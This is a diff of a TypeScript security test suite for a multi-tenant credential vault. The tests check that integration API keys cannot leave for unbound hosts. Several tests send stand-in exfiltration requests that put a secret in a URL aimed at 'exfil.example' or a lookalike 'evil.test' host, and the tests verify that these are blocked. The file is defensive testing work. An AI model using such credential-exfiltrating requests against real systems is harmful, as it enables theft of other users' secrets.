@@ -11,7 +11,13 @@ import { integrationConfigs, integrationDefinitions } from '../../src/data/store
 import { envelopeDecrypt } from '../../src/data/crypto.js';
 import { refreshDefinitions, type IntegrationAction } from '../../src/integrations/definitions.js';
 import { integrationDefinitionStore } from '../../src/integrations/definition-store.js';
-import { createConfig, findConfigForOwner, type IntegrationConfigDoc } from '../../src/integrations/service.js';
+import {
+  createConfig,
+  deleteConfig,
+  findConfigForOwner,
+  type IntegrationConfigDoc,
+} from '../../src/integrations/service.js';
+import { resolveEnvInjection } from '../../src/cofre/process-injection.js';
 import {
   compareCredentialShadow,
   egressOriginsForIntegration,
@@ -373,9 +379,13 @@ describe('an authored action cannot name an out-of-scope SECRET (the two-way joi
     expect((await compareCredentialShadow(orgBUser, tampered, { api_key: SECRET_B })).status).toBe(
       'shadow_unreachable',
     );
-    // …and the egress allow-list falls back to org B's OWN definition, never org A's host.
+    // …and the egress allow-list REFUSES. It used to fall back to org B's own definition here,
+    // which was the C1 hole in its cross-tenant clothing: a join that names an item the reader
+    // cannot reach means the narrower authority has gone missing, and that is precisely when the
+    // wider, author-widenable list must not come back. Org A's host was never a candidate either
+    // way — the two assertions together are what the tampering must not achieve.
     const origins = await egressOriginsForIntegration(orgBUser, 'crm', findConfigForOwner);
-    expect(origins).toEqual(['api.crm-b.example']);
+    expect(origins).toEqual([]);
     expect(origins).not.toContain('api.crm-a.example');
   });
 
@@ -478,6 +488,140 @@ describe('cross-tenant isolation of integration credentials', () => {
 });
 
 // ============================================================================================
+// 4b. THE ORG-SHARED CLASS (B2 review C1 + H1) — the same two attacks, run by a PEER
+// ============================================================================================
+//
+// An org-shared config (`ownerUserId == null`, org-admin-authored) is used by every member of the
+// org, so the criterion above has to hold for a peer who owns nothing and typed nothing. B2 shipped
+// with it holding for the owner only: the peer resolved `unreachable` and fell back to the
+// definition-derived list, so the ADMIN's credential egressed to whatever host the definition had
+// grown since the connect. The probes here are the reviewer's, on the real rail.
+
+describe('an org-shared config protects its PEERS, not just the admin who typed it', () => {
+  const adminA: Actor = { userId: 'adminA', orgId: 'orgA', role: 'org-admin' };
+  const adminB: Actor = { userId: 'adminB', orgId: 'orgA', role: 'org-admin' };
+
+  /** Define `crm` for the org (visible to peers) and connect it as the admin: an org-shared row. */
+  async function defineShared(hosts: string[]): Promise<void> {
+    await defineIntegration(adminA, 'crm', hosts);
+    await integrationDefinitionStore.setVisibility(
+      (await integrationDefinitionStore.getForActor(adminA, 'crm'))!._id,
+      adminA,
+      'org',
+    );
+  }
+  async function connectShared(hosts = ['https://api.crm.example']): Promise<IntegrationConfigDoc> {
+    await defineShared(hosts);
+    const cfg = await createConfig(adminA, { integrationKey: 'crm', configValues: { api_key: SECRET_A } }, deps);
+    expect(cfg.ownerUserId).toBeUndefined();
+    return cfg;
+  }
+
+  it('THE PEER\'S DISCRIMINATING CASE: a host added after the connect never sees the admin\'s secret', async () => {
+    await connectShared();
+    // `bob` is role `user`, owns nothing, has typed nothing, and holds no Cofre item at all.
+    expect(await listCofreItems(bob)).toHaveLength(0);
+    await defineShared(['https://api.crm.example', 'https://exfil.example']);
+
+    const captured = await runApiCall(bob, {
+      method: 'GET',
+      url: 'https://exfil.example/collect?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(captured.status).toBe('failed');
+    expect(fetchSpy).not.toHaveBeenCalled();
+    expect((captured.error as { message: string }).message).toMatch(/not a bound origin/);
+    expect(JSON.stringify(captured)).not.toContain(SECRET_A);
+  });
+
+  it('…while the GRANTED host still works for that peer — the narrowing breaks nobody', async () => {
+    await connectShared();
+    await defineShared(['https://api.crm.example', 'https://exfil.example']);
+    const captured = await runApiCall(bob, {
+      method: 'GET',
+      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(captured.status).toBe('completed');
+    expect(String(fetchSpy.mock.calls[0]![0])).toContain(SECRET_A);
+  });
+
+  it('the admin\'s LOCK stops the peer\'s run too — lock = revoke for the whole org', async () => {
+    const cfg = await connectShared();
+    await lockItem(adminA, cfg.cofreItemId!);
+    const captured = await runApiCall(bob, {
+      method: 'GET',
+      url: 'https://api.crm.example/v1/things?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(captured.status).toBe('failed');
+    expect(fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it('A PEER-ADMIN\'S DELETE LEAVES NOTHING EXTRACTABLE BEHIND', async () => {
+    const cfg = await connectShared();
+    const itemId = cfg.cofreItemId!;
+    // Before the delete the owner can extract it through the I9 primitive: `{kind:'process'}` needs
+    // no origin, so an auto-granted item is fully readable by id alone — which is exactly why an
+    // orphan left behind by a delete is not a bookkeeping problem.
+    const before = await resolveEnvInjection(adminA, { CRM_TOKEN: `cofre:${itemId}` });
+    expect(before.env.CRM_TOKEN).toContain(SECRET_A);
+
+    // The OTHER admin removes the shared integration. Pre-fix the item survived, still
+    // `unlocked_until_locked`, still granted, joined to a config row that no longer exists.
+    expect((await deleteConfig(adminB, 'crm')).verdict).toBe('ok');
+
+    expect(await listCofreItems(adminA)).toHaveLength(0);
+    await expect(resolveEnvInjection(adminA, { CRM_TOKEN: `cofre:${itemId}` })).rejects.toBeInstanceOf(
+      CofreNotFoundError,
+    );
+  });
+});
+
+// ============================================================================================
+// 4c. WHAT THE ORIGIN BINDING ACTUALLY MEANS (B2 review L3) — characterised, not assumed
+// ============================================================================================
+//
+// `boundOrigins` became THE credential-egress control in B2, so it inherits `hostMatchesOrigin`'s
+// pre-existing semantics wholesale: an entry binds a HOST, and a host's whole subtree with it.
+// Neither scheme nor PORT is part of the binding. That is a deliberate, journaled position
+// (docs/findings.md `origin-binding-is-host-only-and-subdomain-wide`, docs/decisions.md 2026-08-03)
+// and not a discovery — but an undocumented widening of it would be invisible without this, and
+// `security/origin-binding.ts` belonged to no slice at the time this was written.
+
+describe('the bound-origin match is host-scoped, subtree-wide, and port-blind (characterised)', () => {
+  it('a sibling domain that merely LOOKS like the bound host is refused', async () => {
+    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
+    const captured = await runApiCall(alice, {
+      method: 'GET',
+      url: 'https://api.crm.example.evil.test/v1?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(captured.status).toBe('failed');
+    expect(fetchSpy).not.toHaveBeenCalled();
+  });
+
+  it('a SUBDOMAIN of the bound host is allowed, and so is any port on it', async () => {
+    await connect(alice, 'crm', ['https://api.crm.example'], SECRET_A);
+    const sub = await runApiCall(alice, {
+      method: 'GET',
+      url: 'https://eu.api.crm.example/v1?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(sub.status).toBe('completed');
+    const port = await runApiCall(alice, {
+      method: 'GET',
+      url: 'https://api.crm.example:8443/v1?k={{integration.crm.api_key}}',
+      authIntegrationKey: 'crm',
+    });
+    expect(port.status).toBe('completed');
+    // Recorded so the consequence is unmissable: whoever controls a subdomain of a bound host, or
+    // any service on another port of it, is inside this credential's blast radius.
+    expect(fetchSpy).toHaveBeenCalledTimes(2);
+  });
+});
+
+// ============================================================================================
 // 5. THE WIRING ITSELF
 // ============================================================================================
 
@@ -496,8 +640,24 @@ describe('the composition root wires the Cofre-backed resolver (not a copy of th
     expect(serverSrc).not.toContain('originFromBaseUrl');
   });
 
-  it('the credential loader runs the WS-C comparator on every read', () => {
+  it('the credential loader delegates to the exported, testable read', () => {
+    // The body used to be a lambda in this file, with the comparator INSIDE its
+    // `catch { return null }` — so a throw while measuring answered "integration not connected"
+    // (B2 review L1), and no test could reach the code to notice. Production now wires the exported
+    // function that `credential-cofre.test.ts` drives directly.
     const wiring = serverSrc.slice(serverSrc.indexOf('setIntegrationCredentialLoader('));
-    expect(wiring.slice(0, 1200)).toContain('compareCredentialShadow');
+    expect(wiring.slice(0, 400)).toContain('loadIntegrationCredentialFields');
+    expect(serverSrc).not.toContain('reportCredentialShadow(');
+  });
+
+  it('the Zoho Sign backend is wired to the comparator too (the third credential reader)', () => {
+    // B2 claimed the comparator ran on "every real credential read"; it ran on one rail. The
+    // served-app signature rail is the second one this composition root can reach — the third,
+    // `integrations/action-executor.ts`, is named as UNCOVERED in credential-cofre.ts rather than
+    // implied to be covered.
+    const wiring = serverSrc.slice(serverSrc.indexOf('makeZohoSignBackend('));
+    expect(wiring.slice(0, 2500)).toContain('observeCredentialRead');
+    expect(wiring.slice(0, 2500)).toContain('observeCredentialShadow');
+    expect(wiring.slice(0, 2500)).toContain('persistRotatedCredentials');
   });
 });
